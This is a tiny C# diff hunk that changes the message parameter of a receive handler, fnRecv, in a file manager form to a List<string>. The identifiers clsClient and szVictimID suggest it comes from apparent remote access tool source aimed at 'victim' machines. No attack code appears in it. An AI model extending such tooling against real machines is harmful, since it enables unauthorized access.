@@ -33,7 +33,7 @@ namespace Eden
 
         private frmFileMgr.stEntryTag fnGetItemTag(ListViewItem item) => (frmFileMgr.stEntryTag)item.Tag;
 
-        private void fnRecv(clsClient clnt, string szVictimID, string[] asMsg)
+        private void fnRecv(clsClient clnt, string szVictimID, List<string> asMsg)
         {
             try
             {
